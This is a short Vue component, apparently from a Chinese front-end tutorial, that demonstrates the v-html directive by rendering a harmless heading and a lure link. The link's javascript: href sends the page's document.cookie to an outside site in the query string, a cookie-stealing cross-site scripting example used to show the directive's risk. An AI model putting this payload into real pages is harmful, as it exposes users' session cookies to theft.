<template>
  <div>
    <div>你好，{{ name }}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
  </div>
</template>

<script>
export default {
  name: 'Demo17-2',
  data() {
    return {
      name: '尚硅谷',
      str: '<h3>你好啊！</h3>',
      str2:
        '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
    }
  }
}
</script>
